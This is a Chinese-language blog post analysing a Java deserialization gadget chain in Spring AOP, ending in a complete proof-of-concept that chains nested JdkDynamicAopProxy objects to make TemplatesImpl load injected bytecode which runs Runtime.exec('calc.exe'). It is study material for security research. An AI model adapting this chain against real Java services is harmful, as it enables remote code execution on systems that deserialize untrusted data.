# SpringAOP链学习


&lt;!--more--&gt;

# SpringAOP链

## 前言

年初还是去年末就看到有佬发了，标题叫啥 Spring 原生链，感觉实战挺有用的，最近也有很多文章在分析这个，就来学学

## 简介

详情参考：https://blog.csdn.net/Cr1556648487/article/details/126777903

AOP（Aspect Orient Programming），直译过来就是 面向切面编程，AOP 是一种编程思想，是面向对象编程（OOP）的一种补充

面向切面编程，实现在不修改源代码的情况下给程序动态统一添加额外功能的一种技术，AOP可以拦截指定的方法并且对方法增强，而且无需侵入到业务代码中，使业务与非业务处理逻辑分离，比如Spring的事务，通过事务的注解配置，Spring会自动在业务方法中开启、提交业务，并且在业务处理失败时，执行相应的回滚策略。

主要应用场景在日志记录、事务管理、权限验证、性能监测

Spring的AOP实现原理其实很简单，就是通过动态代理实现的，其采用了两种混合的实现方式：JDK 动态代理和 CGLib 动态代理。

- JDK动态代理：Spring AOP的首选方法。 每当目标对象实现一个接口时，就会使用JDK动态代理。目标对象必须实现接口
- CGLIB代理：如果目标对象没有实现接口，则可以使用CGLIB代理。

## 环境搭建

只需要添加 `spring-boot-starter-aop` 这个依赖，这个依赖包括`spring-aop`和`aspectJWeaver`这两个所需依赖

```
    &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;
      &lt;version&gt;3.3.10&lt;/version&gt;
    &lt;/dependency&gt;
```

## 调用链分析

### sink点AbstractAspectJAdvice

sink 点是 `org.springframework.aop.aspectj` 包下的 `AbstractAspectJAdvice` 类中的 `invokeAdviceMethodWithGivenArgs` 方法

```
    protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {
        Object[] actualArgs = args;
        if (this.aspectJAdviceMethod.getParameterCount() == 0) {
            actualArgs = null;
        }

        try {
            ReflectionUtils.makeAccessible(this.aspectJAdviceMethod);
            return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);
        } catch (IllegalArgumentException var4) {
            throw new AopInvocationException(&#34;Mismatch on arguments to advice method [&#34; &#43; this.aspectJAdviceMethod &#43; &#34;]; pointcut expression [&#34; &#43; this.pointcut.getPointcutExpression() &#43; &#34;]&#34;, var4);
        } catch (InvocationTargetException var5) {
            throw var5.getTargetException();
        }
    }
```

这里很明显直接就反射调用了

这里 `this.aspectJAdviceMethod` 在构造函数中定义

![image-20250416223619943](https://bu.dusays.com/2025/05/11/68204020c47d1.png)

这个类继承了 `Serializable` 接口的，是个抽象类，其子类为

![image-20250415213743052](https://bu.dusays.com/2025/04/15/67fe612823e51.png)

在这几个子类中我们可以发现 `AspectJAroundAdvice` 的 `invoke` 方法调用了 `invokeAdviceMethod`，然后就会触发 `invokeAdviceMethodWithGivenArgs`，而且这里对 `aspectJAroundAdviceMethod` 的赋值也很简单，直接传就好了

反射调用方法的三要素：method、obj、args，现在 method 有了， args 先不说，有的是无参方法用，看看怎么实现 obj，跟进看下 `this.aspectInstanceFactory` 的实现

```
private final AspectInstanceFactory aspectInstanceFactory;
```

是一个 AspectInstanceFactory 类型的值，继续跟进，发现其是个接口，有几个实现类

![image-20250415214725297](https://bu.dusays.com/2025/05/11/68204020cceae.png)

现在我们的目标是找到一个同时实现 `AspectInstanceFactory` 和 `Serializable` 的子类，并且 `getAspectInstance` 方法可以返回指定的对象，刚好 `SingletonAspectInstanceFactory` 就满足

![image-20250415215137860](https://bu.dusays.com/2025/05/11/682040486013c.png)

因此就可以基本确定 `org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs` 为最终的 sink 点

### 中间链分析

可以跟进一下上面确定的sink点，可以跟到 `org.springframework.aop.framework.ReflectiveMethodInvocation#proceed` 中，其调用链为

```
org.springframework.aop.framework.ReflectiveMethodInvocation#proceed-&gt;
org.springframework.aop.aspectj.AspectJAroundAdvice#invoke-&gt;
org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethod(org.aspectj.lang.JoinPoint, org.aspectj.weaver.tools.JoinPointMatch, java.lang.Object, java.lang.Throwable)-&gt;
org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs
```

看到 `org.springframework.aop.framework.ReflectiveMethodInvocation#proceed` 方法

```
    @Nullable
    public Object proceed() throws Throwable {
        if (this.currentInterceptorIndex == this.interceptorsAndDynamicMethodMatchers.size() - 1) {
            return this.invokeJoinpoint();
        } else {
            Object interceptorOrInterceptionAdvice = this.interceptorsAndDynamicMethodMatchers.get(&#43;&#43;this.currentInterceptorIndex);
            if (interceptorOrInterceptionAdvice instanceof InterceptorAndDynamicMethodMatcher) {
                InterceptorAndDynamicMethodMatcher dm = (InterceptorAndDynamicMethodMatcher)interceptorOrInterceptionAdvice;
                Class&lt;?&gt; targetClass = this.targetClass != null ? this.targetClass : this.method.getDeclaringClass();
                return dm.methodMatcher.matches(this.method, targetClass, this.arguments) ? dm.interceptor.invoke(this) : this.proceed();
            } else {
                return ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this);
            }
        }
    }
```

这里我们要让 `interceptorOrInterceptionAdvice` 对象为 `AspectJAroundAdvice` 。可以看到 `interceptorOrInterceptionAdvice` 对象是从 `this.interceptorsAndDynamicMethodMatchers` 这个 List 中拿出来的，可以在 `ReflectiveMethodInvocation` 中的构造方法中对其赋值

但是这里 `ReflectiveMethodInvocation` 本身并没有实现 Serializable 接口，想要在反序列化过程中使用，只能依赖于动态创建。可以在 `org.springframework.aop.framework.JdkDynamicAopProxy#invoke` 中发现

![image-20250415230349377](https://bu.dusays.com/2025/05/11/68204020b9788.png)

这里刚好实例化了 `ReflectiveMethodInvocation` 类，并且又调用了其 `proceed` 方法，而且恰好这个类又能用来实现动态创建，而且还实现了 `Serializable` 接口，所以这里就是 source 点

分析完毕后，回到刚才的 `org.springframework.aop.framework.ReflectiveMethodInvocation` 中，这里要走到 `return ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this);` 需要避免实现两个 if 语句，进入第一个 if 语句时只要 List 中有一个值就能跳出。第二个 if 语句，我们这里 `interceptorOrInterceptionAdvice` 对象为 `AspectJAroundAdvice`，所以这里也是跳出，故而无需做何操作即可调用 `((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this)`

### source点JdkDynamicAopProxy

来到 `org.springframework.aop.framework` 包下的 `JdkDynamicAopProxy` ，看到其 invoke 方法，注意到其调用 proceed 方法处

```
MethodInvocation invocation = new ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain);
retVal = invocation.proceed();
```

我们要实现`interceptorOrInterceptionAdvice` 对象为 `AspectJAroundAdvice`，也就是说只要关注 `chain` 的赋值即可

```
List&lt;Object&gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);
```

跟进看看 `getInterceptorsAndDynamicInterceptionAdvice` 方法的实现

```
    public List&lt;Object&gt; getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class&lt;?&gt; targetClass) {
        MethodCacheKey cacheKey = new MethodCacheKey(method);
        List&lt;Object&gt; cached = (List)this.methodCache.get(cacheKey);
        if (cached == null) {
            cached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);
            this.methodCache.put(cacheKey, cached);
        }

        return cached;
    }
```

可以看到所以这里 cached 有两种获取方式，一种是从 `this.methodCache` 直接获取已经缓存好的，或者是用 `this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice` 直接创建个新的

先看第一种

```
	private transient Map&lt;MethodCacheKey, List&lt;Object&gt;&gt; methodCache;
......
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        this.methodCache = new ConcurrentHashMap(32);
    }
```

`methodCache` 属性有`transient`修饰符，不参与序列化过程，而且 `readObject` 里也是没有办法修改其值

那看第二种，跟进看看

```
public interface AdvisorChainFactory {
    List&lt;Object&gt; getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class&lt;?&gt; targetClass);
}
```

是个接口类，跟进其实现类 `DefaultAdvisorChainFactory` ，看到其 `getInterceptorsAndDynamicInterceptionAdvice` 方法

```
    public List&lt;Object&gt; getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class&lt;?&gt; targetClass) {
        AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();
        Advisor[] advisors = config.getAdvisors();
        List&lt;Object&gt; interceptorList = new ArrayList(advisors.length);
        Class&lt;?&gt; actualClass = targetClass != null ? targetClass : method.getDeclaringClass();
        Boolean hasIntroductions = null;
        Advisor[] var9 = advisors;
        int var10 = advisors.length;

        for(int var11 = 0; var11 &lt; var10; &#43;&#43;var11) {
            Advisor advisor = var9[var11];
            if (advisor instanceof PointcutAdvisor) {
                PointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor;
                if (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) {
                    MethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher();
                    boolean match;
                    if (mm instanceof IntroductionAwareMethodMatcher) {
                        if (hasIntroductions == null) {
                            hasIntroductions = hasMatchingIntroductions(advisors, actualClass);
                        }

                        match = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);
                    } else {
                        match = mm.matches(method, actualClass);
                    }

                    if (match) {
                        MethodInterceptor[] interceptors = registry.getInterceptors(advisor);
                        if (mm.isRuntime()) {
                            MethodInterceptor[] var17 = interceptors;
                            int var18 = interceptors.length;

                            for(int var19 = 0; var19 &lt; var18; &#43;&#43;var19) {
                                MethodInterceptor interceptor = var17[var19];
                                interceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm));
                            }
                        } else {
                            interceptorList.addAll(Arrays.asList(interceptors));
                        }
                    }
                }
            } else if (advisor instanceof IntroductionAdvisor) {
                IntroductionAdvisor ia = (IntroductionAdvisor)advisor;
                if (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) {
                    Interceptor[] interceptors = registry.getInterceptors(advisor);
                    interceptorList.addAll(Arrays.asList(interceptors));
                }
            } else {
                Interceptor[] interceptors = registry.getInterceptors(advisor);
                interceptorList.addAll(Arrays.asList(interceptors));
            }
        }

        return interceptorList;
    }
```

最后返回的是 `interceptorList` ，有四处 add 方法，每次 add 前都会用 `registry.getInterceptors(advisor)` 生成元素，看下 `registry` 怎么赋值

```
AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();
```

![image-20250416171744030](https://bu.dusays.com/2025/05/11/6820401fec601.png)

是个静态方法，直接返回 `DefaultAdvisorAdapterRegistry` 实例，继续跟进到其 `getInterceptors` 方法

```
    public MethodInterceptor[] getInterceptors(Advisor advisor) throws UnknownAdviceTypeException {
        List&lt;MethodInterceptor&gt; interceptors = new ArrayList(3);
        Advice advice = advisor.getAdvice();
        if (advice instanceof MethodInterceptor) {
            interceptors.add((MethodInterceptor)advice);
        }

        Iterator var4 = this.adapters.iterator();

        while(var4.hasNext()) {
            AdvisorAdapter adapter = (AdvisorAdapter)var4.next();
            if (adapter.supportsAdvice(advice)) {
                interceptors.add(adapter.getInterceptor(advisor));
            }
        }
```

如果这里 `advice` 实现了 `Advice` 和 `MethodInterceptor` 接口，那么就直接调用 `interceptors.add((MethodInterceptor)advice)` ，将其值加入到 `interceptors` 中了，也就是我们的 chain 中

这里 `getAdvice()` 调用的是 Advisor 接口的 `getAdvice()` ，这里可以看出是满足了实现 `Advice` 接口的

```
public interface Advisor {
    Advice EMPTY_ADVICE = new Advice() {
    };
    Advice getAdvice();
    boolean isPerInstance();
}
```

随便找个干净的实现类就好，比如 `DefaultIntroductionAdvisor`，直接返回 advice

刚才我们说了要让 chain，在这里也就是 advice，要为 `AspectJAroundAdvice`，这个类已经实现了 `MethodInterceptor` 接口，所以我们再用 `JdkDynamicAopProxy` 给 `AspectJAroundAdvice` 实现 Advice 接口就好了

那回过头来看看 advisor 的值是否能控制

![image-20250416172201575](https://bu.dusays.com/2025/05/11/68204021222f2.png)

这里 `config` 的值就是 `AdvisedSupport` ，跟进其 `getAdvisors()` 方法

```
public final Advisor[] getAdvisors() {
    return (Advisor[])this.advisors.toArray(new Advisor[0]);
}
```

就是转换成数组返回，可以在 `AdvisedSupport` 的 `addAdvisor` 方法中将 advisors 加入到数组中，是可控的

综上的话，就知道写poc的思路了

1. 构造恶意的 `AspectJAroundAdvice`
2. 内层 `JdkDynamicAopProxy` 动态代理使内层 advisor 实现两个接口
3. 外层 `JdkDynamicAopProxy` 动态代理触发其 invoke 方法，然后调用 `ReflectiveMethodInvocation#proceed` ，最终实现 `TemplatesImpl#newTransformer`

## poc

调用无参方法的话，还是用 TemplatesImpl 加载字节码好了，用 javassist 来构造字节码

```
		ClassPool classpool = ClassPool.getDefault();
        classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classpool.makeClass(&#34;poc&#34;);
        String cmd = &#34;java.lang.Runtime.getRuntime().exec(\&#34;calc.exe\&#34;);&#34;;
        ctClass.setSuperclass(classpool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] bytecode = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, &#34;_bytecodes&#34;, new byte[][]{bytecode});
        setFieldValue(templates, &#34;_name&#34;, &#34;6s6&#34;);
```

套第一层 JdkDynamicAopProxy 动态代理

```
    public static Object getProxy1(Object obj, Class[] clazzs) throws Exception {
    	//设置代理对象
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        
        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);
    }
```

让 advisor实现MethodInterceptor和advice接口，并套第二层JdkDynamicAopProxy 动态代理

```
    public static Object getProxy2(Object obj, Class&lt;?&gt; clazz) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);

        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(
                (Advice) getProxy1(obj, new Class[]{MethodInterceptor.class, Advice.class})
        );
        advisedSupport.addAdvisor(advisor);

        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
    }
```

构造恶意的 `AspectJAroundAdvice` ，确保触发其 invoke 方法时能调用 `TemplatesImpl.newTransformer()`

```
        Method Tem_newTransformer = TemplatesImpl.class.getMethod(&#34;newTransformer&#34;);
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);
        AspectJAroundAdvice advice = new AspectJAroundAdvice(Tem_newTransformer, new AspectJExpressionPointcut(), factory);
```

让 `advice` 实现 Advice 接口

```
        Object proxy1 = getProxy2(advice, Advice.class);
```

综上，完整poc

```
package test;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class poc {
    public static void main(String args[]) throws Exception {

        ClassPool classpool = ClassPool.getDefault();
        classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classpool.makeClass(&#34;poc&#34;);
        String cmd = &#34;java.lang.Runtime.getRuntime().exec(\&#34;calc.exe\&#34;);&#34;;
        ctClass.setSuperclass(classpool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] bytecode = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, &#34;_bytecodes&#34;, new byte[][]{bytecode});
        setFieldValue(templates, &#34;_name&#34;, &#34;6s6&#34;);

        Method Tem_newTransformer = TemplatesImpl.class.getMethod(&#34;newTransformer&#34;);
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);
        AspectJAroundAdvice advice = new AspectJAroundAdvice(Tem_newTransformer, new AspectJExpressionPointcut(), factory);

        Object proxy1 = getProxy2(advice, Advice.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, &#34;val&#34;, proxy1);
        unser(badAttributeValueExpException);
    }

    public static Object getProxy1(Object obj, Class[] clazzs) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);

        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);
    }


    public static Object getProxy2(Object obj, Class&lt;?&gt; clazz) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);

        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(
                (Advice) getProxy1(obj, new Class[]{MethodInterceptor.class, Advice.class})
        );
        advisedSupport.addAdvisor(advisor);

        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object unser(Object obj) throws IOException, ClassNotFoundException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        final ObjectOutputStream objout = new ObjectOutputStream(out);
        objout.writeObject(obj);
        byte[] serializedData = out.toByteArray();
        final ByteArrayInputStream in = new ByteArrayInputStream(serializedData);
        final ObjectInputStream objin = new ObjectInputStream(in);
        return objin.readObject();
    }
}
```

## 总结

核心其实就是两层代理，最外层代理的作用是，在反序列化触发 `BadAttributeValueExpException` 时会调用任意方法的 toString 方法，可以触发其代理类 `JdkDynamicAopProxy` 的 invoke 方法

而最内层则仅仅是为了让内层的 advisor 能满足两个接口实现，让链子正常继续下去

调用栈

```
newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:483, Method (java.lang.reflect)
invokeAdviceMethodWithGivenArgs:634, AbstractAspectJAdvice (org.springframework.aop.aspectj)
invokeAdviceMethod:624, AbstractAspectJAdvice (org.springframework.aop.aspectj)
invoke:72, AspectJAroundAdvice (org.springframework.aop.aspectj)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:483, Method (java.lang.reflect)
invokeJoinpointUsingReflection:344, AopUtils (org.springframework.aop.support)
invoke:208, JdkDynamicAopProxy (org.springframework.aop.framework)
invoke:-1, $Proxy0 (com.sun.proxy)
proceed:186, ReflectiveMethodInvocation (org.springframework.aop.framework)
invoke:215, JdkDynamicAopProxy (org.springframework.aop.framework)
toString:-1, $Proxy1 (com.sun.proxy)
readObject:86, BadAttributeValueExpException (javax.management)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:483, Method (java.lang.reflect)
invokeReadObject:1017, ObjectStreamClass (java.io)
readSerialData:1896, ObjectInputStream (java.io)
readOrdinaryObject:1801, ObjectInputStream (java.io)
readObject0:1351, ObjectInputStream (java.io)
readObject:371, ObjectInputStream (java.io)
unser:87, poc (test)
main:45, poc (test)
```

## 参考

https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ

https://gsbp0.github.io/post/springaop/



---

> 作者: 6s6  
> URL: http://localhost:1313/posts/816babd/  

